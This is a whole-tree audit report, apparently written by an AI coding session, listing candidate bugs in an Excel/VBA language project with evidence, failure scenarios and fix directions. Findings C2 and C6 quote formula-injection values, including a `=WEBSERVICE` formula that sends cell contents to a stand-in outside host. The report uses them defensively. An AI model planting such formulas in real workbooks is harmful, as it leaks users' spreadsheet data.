# Terrarium candidates: whole-tree audit, 2026-09-27

*Cloud session, branch `claude/magical-maxwell-0u2f7v`, against `main` at `f0fb1db`. Read the protocol in [README.md](README.md) first: nothing below has an ID, nothing below has been run in Excel, and every candidate waits for the owner's triage.*

## How this was produced

Eight read-only auditors each took one slice of the tree (translator; reader and emitter; interpreter and runtime; PROLOG; SQL and DATALOG; OPTIMIZE; host, IDE and build; tooling and supply chain) under one brief: find unlogged defects and bug-breeding patterns, quote the code, write a concrete failure scenario, grep both roadmaps before keeping anything, and say whether the path was traced end to end (*confirmed by reading*) or needs Excel to settle (*plausible*). The assembling session then merged four pairs that two auditors found independently, and re-read the code behind seven candidates itself (marked ✔ below). The static half of the project's own verification (29 ratchets, the 7 `-WithExtras` verifiers, the 17 clingo files) passes on this tree; nothing here contradicts it, because none of these candidates is in territory a ratchet covers.

**Severity** is the auditor's: *high* means a silent wrong number, lost data or a security gap; *medium* a crash, raw error, hang or wrong refusal; *low* performance or maintainability. **References inside an entry** such as "finding 3", "F2" or "#7" use that slice's own numbering, given in the table's *slice #* column.

## Recommended first reads

1. **C3** — under Interpret, every `contains` / `does not contain` / `starts with` condition is wrong: English emits the four-argument `instr`, and the interpreter's only `instr` case uses the first two (✔ re-checked).
2. **C15** — Undo, and the automatic put-back after a stopped Run, rename-copy-delete the sheet, so every formula, name, chart or `=SQL`/`=DATALOG` elsewhere that points at it becomes `#REF!` for good (✔ re-checked; found by two auditors).
3. **C1** — `Create a number called X.` inside a loop: Interpret zeroes X each pass, compiled VBA keeps the running value. The two backends give different totals (✔).
4. **C9**, **C10**, **C8**, **C12** — one family: a number's *spelling* (locale-dependent `CDbl`/`CStr`, or the literal as typed) standing in for its *value* in DATALOG, PROLOG and SQL identity and arithmetic.
5. **C6** and **C58** — the formula-injection guard covers one sink shape; several writers, and the phrasebook's own `=DATALOG` templates, bypass it (✔ for the latter).

## Summary

| # | Sev | Verdict | Slice (slice #) | Candidate | Related |
|---|---|---|---|---|---|
| C1 ✔ | high | confirmed by reading | Reader and emitter (1) | `Create a number called X.` inside a loop: the interpreter zeroes X on every pass, compiled VBA does not |  |
| C2 | high | confirmed in code, live effect needs repro | Reader and emitter (3) + Interpreter and runtime (4) | `for-each-row` writes `.Value` back over the whole range, so every formula in it becomes a constant |  |
| C3 ✔ | high | confirmed by reading | Interpreter and runtime (1) | The interpreter's `instr` builtin ignores its 3rd and 4th arguments, so every "contains", "does not contain" and "starts with" sentence gives the wrong answer |  |
| C4 | high | confirmed in code, live effect needs repro | Interpreter and runtime (3) | The interpreter ignores a variable's declared type, so "number" and "text" variables hold whatever was last assigned |  |
| C5 | high | plausible, needs live repro | Interpreter and runtime (5) | The interpreter reads numeric literals with `IsNumeric`/`CDbl` on source text, so a comma-decimal locale reads `1.5` as 15 while the compiled backend reads 1.5 | C20, C34 |
| C6 | high | confirmed in code, live effect needs repro | Interpreter and runtime (6) | The SEC.4 formula-injection guard covers one shape of one sink; the compiled backend, cell-to-cell copies, array writes and Replace all skip it | C58 |
| C7 | high | confirmed by reading | PROLOG (1) | Keyed atoms in the condition and then-branch of `(if ...)` share anonymous column variables, which adds a silent join |  |
| C8 | high | confirmed by reading | PROLOG (3) | Numeric literals are compared by spelling, so `0.50`, `3.0`, `+5`, `05` and `.5` never match the same number from a Table or from `is` | C41 |
| C9 ✔ | high | confirmed by reading | SQL and DATALOG (1) | DATALOG `(sum ...)` converts values with `CDbl`: locale-dependent totals, TRUE summed as -1, raw "Type mismatch" on text | C10, C41 |
| C10 | high | confirmed by reading | SQL and DATALOG (2) | DATALOG matches rule constants and facts against table numbers by `CStr` spelling, so fractional matches depend on the locale | C9, C12 |
| C11 | high | confirmed by reading | SQL and DATALOG (3) | SQL `/` is always real division; SQLite divides two integers as integers |  |
| C12 | high | confirmed by reading | SQL and DATALOG (4) | Row identity is the `CStr` spelling in DISTINCT, GROUP BY, UNION/INTERSECT/EXCEPT and JOIN ... ON keys, but exact typed comparison in WHERE and residual ON | C10, C13 |
| C13 | high | confirmed by reading | SQL and DATALOG (5) | A number compared with text falls back to `CStr` text order, which makes MIN/MAX and ORDER BY depend on row order, the comparison non-transitive, and the answer locale-dependent | C12 |
| C14 | high | confirmed in code, live effect needs repro | SQL and DATALOG (6) | Blank cells come back as 0 in every SQL and DATALOG spill |  |
| C15 ✔ | high | confirmed by reading | Host, IDE and build (1) + Interpreter and runtime (2) | Undo and the automatic put-back after a stopped run turn every outside reference to a restored sheet into #REF! | C63 |
| C16 | high | confirmed in code, live effect needs repro | Host, IDE and build (2) + Interpreter and runtime (8) | A "When the sheet changes:" handler re-enters the interpreter in the middle of a run and clobbers the outer run's module state | C17 |
| C17 | high | confirmed by reading | Host, IDE and build (3) | The sheet-change handler writes to whichever sheet is active, and Frazaro's own IDE writes trigger it. A handler can overwrite the program's own sentences. | C16 |
| C18 | high | confirmed by reading | Host, IDE and build (5) | Undo snapshots and the parse-failure log stay in the user's workbook as very-hidden sheets, travel with it when shared, and cannot be cleared from the product | C63 |
| C19 ✔ | medium | confirmed in code, live effect needs repro | Translator (1) | Nested Try: the inner Try restores the step handler instead of the outer Try's handler, and it clears the outer "the problem" flag | C27 |
| C20 | medium | plausible, needs live repro | Translator (2) | `IsNumTok` classifies number tokens with locale-dependent `IsNumeric`, and the same file already contains the invariant classifier | C34, C5 |
| C21 | medium | confirmed by reading | Translator (3) | Pattern literals and keyword-alias surfaces are never checked against the tokenizer's alphabet, so a rule can load and still never be able to match |  |
| C22 | medium | confirmed by reading | Translator (4) | A template slot name that is not in the pattern survives into the output as the literal text `{name}` |  |
| C23 | medium | confirmed by reading | Translator (5) | `raw` consent is keyed by a whitespace-blind hash, but whitespace is semantic in the VBA that `raw` injects |  |
| C24 | medium | confirmed by reading | Translator (6) | Phrasebook directive arity is unchecked (except `at-row`), so a short directive raises a raw runtime error with no file or line |  |
| C25 | medium | confirmed by reading | Translator (7) | EnglishResolveCheck does not skip `;` comments, and raw VLA rows carry their comments into the output |  |
| C26 | medium | plausible, needs live repro | Translator (8) | The UTF-8 read silently becomes ANSI decoding in the fallback (and the reverse case silently inserts U+FFFD), even though a strict decoder already exists | C31, C32 |
| C27 | medium | confirmed by reading | Reader and emitter (2) | `Show all rows.` (and any macro ending in `(on-error goto 0)`) switches off the step handler for the rest of the procedure, and switches off an enclosing Try | C19, C35 |
| C28 | medium | confirmed in code, live effect needs repro | Reader and emitter (4) | The emitter's name mangling is not one-to-one, and it can mangle a legal English name into a VBA reserved word |  |
| C29 | medium | confirmed by reading | Reader and emitter (5) | Optional parameter defaults may be any expression, but VBA needs a constant |  |
| C30 | medium | confirmed in code, live effect needs repro | Reader and emitter (6) | String literals are copied into VBA source without line-break or line-length safety |  |
| C31 | medium | confirmed by reading | Reader and emitter (7) | `(include "…")` files are read as ANSI, resolved against ActiveWorkbook, and a UTF-8 BOM breaks them | C26, C32 |
| C32 | medium | plausible, needs live repro | Reader and emitter (8) | `ReadTextFile`'s "ANSI fallback" never runs for badly encoded text, so ANSI programs import with U+FFFD | C26, C31 |
| C33 | medium | confirmed in code, live effect needs repro | Reader and emitter (9) | `delete-sheet` under Try leaves `DisplayAlerts = False` for the rest of the run |  |
| C34 | medium | confirmed by reading | Reader and emitter (10) | SymName, FormulaQuote and QuoteDatum classify numbers with `IsNumeric`, so `1,000` becomes two arguments (extends EN.4) | C20, C5 |
| C35 | medium | confirmed by reading | Interpreter and runtime (7) | The interpreter's error model differs from VBA's in three ways, which breaks every prelude error idiom (try-else, with-fast-excel, with-screen-off, with-no-alerts, with-protected-sheet, with-error-handler) | C27 |
| C36 | medium | confirmed by reading | Interpreter and runtime (9) | The interpreter forces `+`/`-` through `CDbl`; the compiled backend emits VBA's native operators |  |
| C37 | medium | confirmed by reading | Interpreter and runtime (10) | The interpreter's `for` loop does not match VBA's For/Next: the counter's final value and writes to the counter inside the body both differ |  |
| C38 | medium | confirmed by reading | Interpreter and runtime (11) | A write that succeeded can still end the Run with a raw "Type mismatch", because the log line calls `CStr` on arrays and multi-cell ranges |  |
| C39 | medium | confirmed in code, live effect needs repro | Interpreter and runtime (12) | Runtime helpers that fail with an Excel error, not `Err.Raise`, still go through `Application.Run`; "Work on sheet" with a bad name leaves an orphan sheet on every Run |  |
| C40 | medium | confirmed by reading | PROLOG (2) | `not` enumerates every proof of its goal instead of stopping at the first one |  |
| C41 | medium | confirmed in code, live effect needs repro | PROLOG (4) | Numbers pass through 15-significant-digit, E-notation text between goals, which loses precision and creates numbers the engine cannot read back | C8, C9 |
| C42 | medium | plausible, needs live repro | PROLOG (5) | A Table cell holding an Excel error (for example #N/A) breaks table-to-fact conversion with a raw error, or silently becomes text |  |
| C43 | medium | confirmed by reading | PROLOG (7) | Negation over a variable that is bound only later ("floundering") gives a silent wrong answer |  |
| C44 | medium | confirmed by reading | SQL and DATALOG (7) | An error value anywhere in a table's data rows produces a raw `#SQL! Type mismatch` / `#DATALOG! Type mismatch` |  |
| C45 | medium | confirmed by reading | SQL and DATALOG (8) | `AND`/`OR` guards do not protect a division: `WHERE Qty <> 0 AND Total / Qty > 5` refuses, and the comment claiming this is safe is stale |  |
| C46 | medium | confirmed by reading | SQL and DATALOG (9) | Expressions over aggregates in the SELECT list are refused with a message that says the opposite |  |
| C47 | medium | confirmed by reading | SQL and DATALOG (10) | There are no quoted identifiers, so a column whose header has a space or a non-ASCII letter cannot be referenced |  |
| C48 | medium | plausible, needs live repro | SQL and DATALOG (11) | Two table arguments that resolve to the same name silently replace each other (DATALOG) |  |
| C49 ✔ | medium | confirmed in code, live effect needs repro | OPTIMIZE (1) | A search stopped by the seconds guard is memoized, which freezes a timing accident as the session's answer |  |
| C50 | medium | confirmed by reading | OPTIMIZE (2) | A literal count past the Long range crashes with a raw "Overflow"; the Table-count and effort paths guard against this, the literal path does not |  |
| C51 | medium | confirmed by reading | OPTIMIZE (3) | The command's formula splitter mis-reads Excel's `'` escape inside a structured reference and refuses a valid formula |  |
| C52 | medium | confirmed in code, live effect needs repro | Host, IDE and build (4) | Event registrations disappear silently: when a close is cancelled, and after the workbook is reopened. Handler failures go to Debug.Print only. |  |
| C53 | medium | plausible, needs live repro | Host, IDE and build (6) + Tooling and supply chain (6) | Auto-load registration matches OPEN slots by exact string and leaves gaps when it deletes |  |
| C54 | medium | confirmed by reading | Tooling and supply chain (1) | The check-count floor is stale (28 of 29), and CI and release.ps1 apply no floor at all |  |
| C55 | medium | confirmed by reading | Tooling and supply chain (2) | check_id_registry.ps1 reports "clean" when the governed file set is empty |  |
| C56 | medium | confirmed by reading | Tooling and supply chain (3) | The generated english_expanded.vla is trusted by header stamp only: truncate its body and two ratchets pass |  |
| C57 | medium | confirmed by reading | Tooling and supply chain (5) | release.ps1 publishes even when `git fetch` or `git push origin main` fails |  |
| C58 ✔ | medium | confirmed by reading | Tooling and supply chain (7) | `interpolate` splices slot values into =DATALOG formulas raw; the phrasebook's "the macro doubles the quotes" claim is false | C6 |
| C59 | medium | plausible, needs live repro | Tooling and supply chain (8) | check_word_automation_security.ps1 covers Word only; the interpreter's Excel `Workbooks.Open` runs the target's macros at the programmatic default |  |
| C60 | low-medium | confirmed by reading | Translator (9) | Action names from the previous program leak through EnglishResetGrammar and delete the next phrasebook's function words |  |
| C61 | low-medium | confirmed by reading | Reader and emitter (12) | A phrasebook macro silently overrides a prelude macro of the same name |  |
| C62 | low-medium | confirmed by reading | Interpreter and runtime (13) | A Run restores only ScreenUpdating; StatusBar, Calculation and the program sheet's protection are left changed |  |
| C63 | low-medium | confirmed by reading | Interpreter and runtime (14) | Snapshots mishandle hidden sheets: a very-hidden target blocks the Run, a Hidden sheet comes back visible, and a restored sheet moves to the end of the tabs | C18 |
| C64 | low-medium | plausible, needs live repro | PROLOG (6) | Hot unifier primitives index Collections by position, which is the O(n²) pattern PROLOG.28 measured and removed elsewhere, and every candidate copies the whole environment and every fact |  |
| C65 | low-medium | confirmed by reading | Host, IDE and build (7) | The legacy menu has drifted from the ribbon, although the code says the three surfaces "cannot drift" |  |
| C66 | low-medium | confirmed in code, live effect needs repro | Host, IDE and build (8) | Trace, transcript and feedback renderers build unbounded text quadratically and write it one cell at a time |  |
| C67 | low | plausible, needs live repro | Translator (10) | G-RENDER uses locale `UCase$`, so under a Turkish locale a rendered sentence starting with "i" cannot be re-parsed |  |
| C68 | low | confirmed by reading | Translator (11) | The vocabulary load path carries several quadratic tails that run on every Check |  |
| C69 | low | confirmed by reading | Translator (12) | A text-like slot's default value skips the slot's own rendering (smell) |  |
| C70 | low | confirmed by reading | Reader and emitter (11) | With TCO on, locals keep their values between "recursive" calls |  |
| C71 | low | confirmed by reading | Reader and emitter (13) | Lint's form splitter resets its in-string state on every line, so valid multi-line strings are refused |  |
| C72 | low | confirmed by reading | Reader and emitter (14) | `IsProtectedModule` still lists 3 names in a 30-module project |  |
| C73 | low | plausible, needs live repro | Interpreter and runtime (15) | The interpreter decides which variable a name means with `vbTextCompare`, not the invariant `Fold` that LX.3 made the rule for identity |  |
| C74 | low | smell | Interpreter and runtime (16) | F16 (smell). The IN.11 comment says the `argVals` chain is ByRef, but the code is ByVal throughout |  |
| C75 | low | smell | Interpreter and runtime (17) | F17 (smell). `VlaSlice.Item` does not check its index |  |
| C76 | low | confirmed by reading | PROLOG (8) | `findall` does not copy unbound template variables, so bag elements alias each other and the caller's variable |  |
| C77 | low | confirmed by reading | PROLOG (9) | Keyed atoms cannot address a column whose header contains a space |  |
| C78 | low | confirmed by reading | SQL and DATALOG (12) | `LIMIT` or an `ORDER BY` ordinal above 2,147,483,647 overflows `CLng` and returns a raw "Overflow" |  |
| C79 | low | confirmed by reading | SQL and DATALOG (13) | VLA_Relation's header forbids calling VLA_Messages, but the module calls it (layer contract drift) |  |
| C80 | low | confirmed by reading | OPTIMIZE (4) | The four worksheet entry points are copied bodies, and the header claims OPTIMISE is a one-line alias |  |
| C81 | low | confirmed by reading | Host, IDE and build (9) | A build that fails part-way leaves its half-assembled add-in workbook open, and DisplayAlerts is forced to True instead of restored |  |
| C82 | low | confirmed by reading | Tooling and supply chain (4) | Three of the 29 "checks" cannot fail on what they measure, and two read a stale, silently-filtered test-file list |  |
| C83 | low | confirmed by reading | Tooling and supply chain (9) | Installer signing identity is a CN string: silent re-mint, no pinning, exportable key, no timestamp |  |
| C84 | low | confirmed by reading | Tooling and supply chain (10) | CI supply chain: tag-pinned action, default token permissions, no floor |  |

*Triage column for the owner: append `→ TER-n`, `→ folded into <ID>` or `→ rejected: <why>` after a candidate's heading below.*

## Candidates

### C1 ✔ — `Create a number called X.` inside a loop: the interpreter zeroes X on every pass, compiled VBA does not

*high · confirmed by reading · Reader and emitter, slice finding 1* · *re-read by the assembling session*

- Class: 10/5 (two backends disagree; silent wrong numbers) / **Severity: high** / Verdict: CONFIRMED by reading both backends. Needs a live run to observe.
- Where: `src/VLA_SentenceEngine.bas:4383-4385` emits `(dim v Double|String|)` **in place**, wherever the sentence stands. `src/VLA.bas:4336` (`Case "dim"` → `EmitDimCore`) emits a plain `Dim` at that position. `src/VLA_Interpreter.bas:876-893` (`ExecDim`) runs it as a statement.
- Evidence:
```vba
' VLA_SentenceEngine.bas:4383
Case "number": ParseStmt = pad & "(dim " & v & " Double)"
' VLA_Interpreter.bas:876 ExecDim - executed every time control reaches it
Case "double", "long", "integer", "single", "currency"
    v = 0
...
VLA_Runtime.VlaDictSet frame, nm, v
```
  In VBA, `Dim` is a declaration, not a statement. The variable is initialised once, when the procedure is entered. Reaching `Dim subtotal As Double` again on the next loop pass does nothing.
- Failure scenario: `Count r from 2 to 10:` / `Create a number called subtotal.` / `Increase subtotal by cell B{r}.` / `Put subtotal into cell C{r}.` Interpret gives C = B on each row, because subtotal is reset to 0 every pass. Run/Compile gives a running total. The same program produces different numbers on the two backends, and neither says anything. A second consequence: `Create a number called t.` in both arms of an If is two `Dim t` lines in one procedure. That is VBA's "Duplicate declaration in current scope", an untrappable compile modal, while Interpret runs happily. `MarkDeclared`→`AddKeyed` (SentenceEngine:7423, 7495) swallows the duplicate silently.
- Live repro: put the four sentences above in a program with B2:B10 = 1. Interpret gives C2:C10 = 1. Compile+Run gives 1..9.
- Dedupe: searched both roadmaps for "Create a number called", "Duplicate declaration", "dim.*loop", "re-initiali": no hits. TER-11 and TER-9 are unrelated.
- Fix direction: pick one semantics and hold both backends to it. The least surprising option is to make `Create` also emit an explicit reset after the `Dim`, e.g. `(dim t Double) (set! t 0)`, and hoist the `Dim` to the procedure top, the way undeclared assigned names already are (SentenceEngine ~7373). Also refuse a second `Create` of the same name in one action.
- Ratchet-able?: Yes, cheaply. Have a golden/pure test transpile every `Create` sentence form inside a loop body and assert that the emitted `Dim` sits outside any `For`/`Do` block. Or have a static check over emitted text: no `^\s{8,}Dim ` line inside a loop.

### C2 — `for-each-row` writes `.Value` back over the whole range, so every formula in it becomes a constant

*high · confirmed in code, live effect needs repro · Reader and emitter, slice finding 3*

- Class: 3/8 (data loss) / **Severity: high** (silent data loss), with limited reach (VLA-level form; no English sentence emits it today) / Verdict: CONFIRMED by reading. PLAUSIBLE for the live effect.
- Where: `src/VLA.bas:4724-4777` (`EmitForEachRow`), `src/VLA_Runtime.bas:942-968` (`VlaSlabRead`/`VlaSlabWrite`), `src/VLA_Interpreter.bas:1201-1238`.
- Evidence:
```vba
VlaSlabRead = src.Value            ' formulas read as their results
...
destRange.Resize(nRows, nCols).Value = arr   ' every cell rewritten, touched or not
```
- Failure scenario: `(for-each-row (row (range "A2:D100")) (set! (row 4) (* (row 4) 1.1)))` over a sheet where column C holds `=A2*B2`. After the loop, C2:C100 are frozen numbers. Later edits to A/B silently stop flowing. Both backends do the same, so parity tests pass. The design notes (BETA_REARVIEW:9645-9680) never mention formulas.
- Live repro: put `=A2*2` in B2:B5, run a for-each-row over A2:B5 that only changes column 1, then inspect B2 with `.HasFormula`.
- Dedupe: searched for `for-each-row`, `VlaSlabWrite`, PF.4c. The design entry exists but formulas are not discussed.
- Fix direction: read `.Formula` alongside `.Value` and write back only the columns (or cells) whose value changed, or refuse a range that `HasFormula` (a refusal in words). Cheapest: in `VlaSlabRead`, refuse when `src.HasFormula` is not `False`.
- Ratchet-able?: not statically. A host test with a formula column would pin it.

#### Independent second account (Interpreter and runtime, slice finding 4)

- Class: 8/7 (data loss, formula injection) / Severity: **high** (silent loss of formulas), but only reachable from hand-written VLA today / Verdict: **CONFIRMED** for both backends
- Where: `src/VLA_Runtime.bas:942-968` (`VlaSlabRead`/`VlaSlabWrite`), `src/VLA_Interpreter.bas:1212-1241`, `src/VLA.bas:4724` (`EmitForEachRow`, the same helper pair).
- Evidence:
```vba
Public Sub VlaSlabWrite(ByRef arr As Variant, ByVal destRange As Range)
    ...
    destRange.Resize(nRows, nCols).Value = arr
```
- Failure scenario: `(for-each-row (row (range "a2:d100")) (set! (row 4) (* (row 2) 2)))` on a range whose column C holds `=A2*1.2` formulas. Every cell of A2:D100 is written back from its value snapshot, so column C's formulas become frozen numbers even though the body never touched column C. A text cell holding `'=HYPERLINK(...)` or `'00123` is read as `=HYPERLINK(...)`/`00123` and written back as typed input: a live formula and the number 123. That is a SEC.4 bypass. The goldens cannot catch this because both backends do the same thing.
- Live repro: Put `=ROW()` in C2:C4 and run the form above over A2:D4. Check `C2.HasFormula`.
- Dedupe: I grepped for `VlaSlabWrite`, PF.4b/c and "formula" near them. Not filed.
- Fix direction: Write back only the columns (or cells) the body assigned: track dirty indices in `ExecForEachRow` and in the emitted twin. At minimum, skip `HasFormula` cells and run string cells through the SEC.4 rule, as `RewriteTextCell` already does (`VLA_Runtime.bas:1927-1946`).
- Ratchet-able?: Yes, as a class: grep for `\.Value\s*=` in the runtime and require each site to be on a reviewed list that says whether it guards or preserves formulas (SEC.4 claims one sink; there are several, see F6).

### C3 ✔ — The interpreter's `instr` builtin ignores its 3rd and 4th arguments, so every "contains", "does not contain" and "starts with" sentence gives the wrong answer → IN.17

*high · confirmed by reading · Interpreter and runtime, slice finding 1* · *re-read by the assembling session*

- Class: 10 (backend divergence) / Severity: **high** (a silently wrong branch in the default runtime) / Verdict: **CONFIRMED** (traced end to end)
- Where: `src/VLA_Interpreter.bas:2414-2415` (`TryEvalBuiltin`). The phrasebook shape is at `scripts/polyglotta/english.vla:4044-4052` and 4059-4060. The corpus use is `scripts/instructions_golden.vla:350`.
- Evidence:
```vba
        Case "instr"
            TryEvalBuiltin = InStr(CStr(ArgAt(argVals, 0)), CStr(ArgAt(argVals, 1)))
```
  English produces the 4-argument VBA form: `"If code contains \"x\""` becomes `(positive? (instr 1 code "x" vbtextcompare))`.
- Failure scenario: For `If code contains "x", show "hit".` with `code = "xyz"`, the interpreter evaluates `InStr("1", "xyz")`, which is 0, so the branch never runs. The compiled backend runs `instr(1, code, "x", vbTextCompare)`, which is 1. With the interpreter: "does not contain" is always true, "contains" is always false (except for degenerate text), and "starts with" (`(= (instr 1 code "AB" vbtextcompare) 1)`) is almost always false. `instructions.txt:98` ("If cell in column F row check-row contains "ok", make ... bold") is wrong under the interpreter. The golden check `VLA_Tests_Host.bas:2850` ("F1 bold (contains-test hit)") still passes by coincidence: `instructions.txt:102-103` ("Count stripe-row from 1 ... step 2: Make cell in column F row stripe-row bold") bolds F1 anyway. So the goldens cannot see this.
- Live repro: Interpret `Put "xyz" into cell A1.` / `If cell A1 contains "x", put "hit" into cell B1.` Expect B1 = "hit" under Compile. Under Interpret, B1 stays empty.
- Dedupe: I grepped both roadmaps for `instr`, `contains`, `TryEvalBuiltin`. No item covers it. The only interpreter pin for `instr` is the 2-argument `VLA_Tests.bas:5961`.
- Fix direction: Dispatch `instr` on its arity (2 args: `InStr(a,b)`; 3: `InStr(start,a,b)`; 4: `InStr(start,a,b,compare)`). Audit every other `TryEvalBuiltin` arm the same way: `msgbox` also drops its buttons/title and returns Empty instead of the button id.
- Ratchet-able?: Yes. `check_backend_parity.ps1` counts a form as pinned if any pin exists, so it cannot see arity. A check could take every builtin call shape the phrasebook emits (head plus argument count, from `english.vla`'s own `test-success` VLA) and require an interpreter pin with the same arity.

### C4 — The interpreter ignores a variable's declared type, so "number" and "text" variables hold whatever was last assigned

*high · confirmed in code, live effect needs repro · Interpreter and runtime, slice finding 3*

- Class: 5/10 (Variant coercion, backend divergence) / Severity: **high** (silently wrong values and branches) / Verdict: interpreter side **CONFIRMED**; compiled side by VBA's Dim semantics (**PLAUSIBLE** until run)
- Where: `src/VLA_Interpreter.bas:876-893` (`ExecDim`), `999-1011` (`ExecSet` stores the coerced value as it is). English emits typed Dims at `src/VLA_SentenceEngine.bas:4383-4384` (`number`→`Double`, `text`→`String`).
- Evidence:
```vba
        Case "double", "long", "integer", "single", "currency"
            v = 0
    ...
    VLA_Runtime.VlaDictSet frame, nm, v          ' type then forgotten; every later set! stores raw
```
- Failure scenario: `Create a number called total. Set total to value in cell A1. If total is greater than 5, show "big".` with A1 holding the text "2" (a text-formatted or imported cell). Compiled: `total As Double = 2`, the test is false. Interpreted: total is the String "2" and the literal is the Double 5. VBA's Variant-vs-Variant rule makes a string compare greater than any number, so the test is **true**. With A1 blank, compiled `total = 0` and `Log total` prints "0"; the interpreter stores Empty, prints "", and `Put total into cell B1` clears B1 instead of writing 0. The reverse also happens: `Create a text called code. Set code to 5.` followed by `If code is "5"` is True compiled and False interpreted (Double vs String).
- Live repro: The program above, run under Compile and under Interpret with A1 = `'2`.
- Dedupe: I grepped for `ExecDim`, "declared type" and "untyped". Not filed. The IN.3 comment in ExecConst calls the type "emitter-only signature noise", but that is about Const, not Dim.
- Fix direction: Record each variable's declared type in the frame (a side dictionary `name -> vartype`), and coerce on every `set!` to a plain name the way VBA's Let does (`CDbl`/`CStr`/`CLng`/`CBool`, raising the same type-mismatch the compiled program would).
- Ratchet-able?: Partly. Add a parity host test (`TestStmtParity`) that assigns text, blank and date cells into each English-declarable type and compares the two backends.

### C5 — The interpreter reads numeric literals with `IsNumeric`/`CDbl` on source text, so a comma-decimal locale reads `1.5` as 15 while the compiled backend reads 1.5

*high · plausible, needs live repro · Interpreter and runtime, slice finding 5*

**Roadmap link:** Extends EN.4.

**Related:** C20, C34

- Class: 5 (house rule INTRINSICS #2) / Severity: **high** (silently wrong numbers, different per machine) / Verdict: **PLAUSIBLE** (locale behaviour needs a de-DE machine)
- Where: `src/VLA_Interpreter.bas:1652-1654` (the atom base case) and `1920-1921` (`EvalQuoteDatum`).
- Evidence:
```vba
        If IsNumeric(s) Then
            EvalExpr = CDbl(s)
```
- Failure scenario: With Windows regional settings set to German, the VLA `(+ 1.5 1)` compiles to VBA source `(1.5 + 1)`. VBA's own parser reads that invariantly as 2.5. The interpreter calls `CDbl("1.5")`, and in de-DE "." is the thousands separator, so that is 15 and the answer is 16. In en-US, an atom like `1d2` or `&h10` also passes `IsNumeric` and becomes 100 or 16. The English path emits literals such as `5%` → `(/ 5 100)`, so every decimal in an English program reaches this code.
- Live repro: With the region set to German, run `eval "(+ 1.5 1)"` in the CLI, and Interpret `Put 1.5 into cell A1.`.
- Dedupe: `BETA_REARVIEW.md:12100-12105` notices this convention and explicitly declines to re-litigate it ("this interpreter's OWN pre-existing atom convention"), but no item was filed. It extends EN.4, which is scoped to the reader, not this backend.
- Fix direction: Use the same `IsNumericLiteralText`/`Val` pair the expand-time code already uses (per BETA_REARVIEW ~11872).
- Ratchet-able?: Yes. Grep the modules that handle source text for `CDbl(`/`IsNumeric(` applied to a variable that holds token text. The interpreter's atom path is the obvious first entry for the list.

### C6 — The SEC.4 formula-injection guard covers one shape of one sink; the compiled backend, cell-to-cell copies, array writes and Replace all skip it

*high · confirmed in code, live effect needs repro · Interpreter and runtime, slice finding 6*

**Roadmap link:** Extends SEC.15 (formulas a program writes are not screened); this is the sink-coverage half.

**Related:** C58

- Class: 7 (security) / Severity: **high** (a data-borne string becomes a live formula, and a formula can reach the network through `WEBSERVICE`) / Verdict: compiled and array paths **CONFIRMED**; object and Replace paths **PLAUSIBLE**
- Where:
  - `src/VLA.bas:4365-4367`: compiled `set!` emits `range("b1") = x` with no guard.
  - `src/VLA_Interpreter.bas:3262-3263`: `IsObject(v)` goes to `Set obj.Value = v` and skips `NeutralizeFormulaInjection`.
  - `3247`: arrays pass straight through (their VarType is not `vbString`).
  - `3906-3924`: `Range.Replace` Replacement text is not guarded.
  - `VlaSlabWrite` (F4).
- Evidence:
```vba
        Case "value"
            If IsObject(v) Then
                Set obj.Value = v                      ' no guard
            Else
                guardedVal = NeutralizeFormulaInjection(v)   ' scalar strings only
```
- Failure scenario:
  - (a) `Put cell A1 into cell B1.` (`{e:expr}` = `(range "a1")`, an object) where A1 holds imported text `'=WEBSERVICE("http://x/?"&C1)`. B1 becomes a live formula under both backends.
  - (b) Any program run through Compile, or later exported (IN.4): `Put name into cell B1.` with name = `=HYPERLINK(...)` writes a formula. The interpreter writes text, so the two backends disagree on the same program.
  - (c) `(set! (range "a1:a2") (array "=1+1" "x"))` writes a formula.
  - (d) Replace-in with replacement text starting "=" on a cell that matches whole.
- Live repro: (a) and (b) as written. Check `B1.HasFormula` under each backend.
- Dedupe: SEC.4 (closed) claims `DynamicSet`'s value case is "the ONLY `.Value`-writing site in the whole codebase". SEC.15 covers only the `.Formula` sink. Neither mentions the compiled backend, objects, arrays or Replace. This is not filed.
- Fix direction: Put the guard in a runtime helper that both backends call (`VlaPutValue(rng, v)`, above the inject boundary, handling object, array and scalar values), and have `EmitStmt`'s set!-to-place emit that call. Guard the Replacement argument too.
- Ratchet-able?: Yes. Every `.Value =` / `.Value2 =` write in `src/` and every emitted `= ` to a range place must either go through the helper or be on a reviewed list.

### C7 — Keyed atoms in the condition and then-branch of `(if ...)` share anonymous column variables, which adds a silent join

*high · confirmed by reading · PROLOG, slice finding 1*

- Class: correctness (10, duplicated naming scheme) / Severity: **high** / Verdict: **CONFIRMED** (traced by reading)
- Where: `src/VLA_Prolog.bas:3615-3620` (the `or`/`if` arm of `DesugarBodyItem`), `:3398-3400` (`AnonymousColumnVarName`), `:3730-3736`
- Evidence:
```vba
For ctlIdx = 2 To lst.Count
    Dim innerCtl As Variant
    DesugarBodyItem innerCtl, lst.Item(ctlIdx), anonPrefix, itemIndex, headerMap   ' same itemIndex for C, T and E
...
AnonymousColumnVarName = anonPrefix & itemIndex & "C" & colIndex
```
- Failure scenario: the anonymous name for an unmentioned column is built only from the prefix, the index of the *top-level* body item and the column position. Every keyed atom nested inside one `(if C T E)` therefore gets the same names. C and T run on one path, since the condition's bindings carry into the then-branch. So when C and T both leave column j unmentioned, they are forced to hold equal values in column j. Take the tables `Leave(name, shift, reason)` and `Staff(name, dept, level)` and this query: `(query (shifts (shift S)) (if (leave (shift S) (name W)) (staff (name W) (dept D)) (= D none)))`. Both `leave.reason` and `staff.level` become `VlaAnonQ3C3`, so the then-branch matches only when a person's level equals the text of their leave reason. That almost never happens. The condition has already committed, so the else-branch is skipped too, and the shift quietly drops out of the result. There is no refusal. Rule bodies are affected the same way (`VlaAnonB<bi>C<j>`, freshened per invocation, but still shared within one). So are `(not (if ...))`, `(findall T (if ...) B)` and `(or (if ...) ...)`.
- Live repro: build the two Tables above so that the leave reasons are text and the levels are numbers. `=PROLOG("(query (leave (name W) (shift S)) (if (leave (shift S) (name W)) (staff (name W) (dept D)) (= D none)))", Leave, Staff)` returns no rows. Replacing the then-branch with its positional form `(staff W D L)` returns them.
- Dedupe: I grepped "VlaAnon", "anonymous col", "keyed" and "if" in both roadmaps. The only hits are DATALOG.7, which is about a refusal *message* naming `VlaAnon...`, and BETA_REARVIEW:8550, a test name. This is not filed.
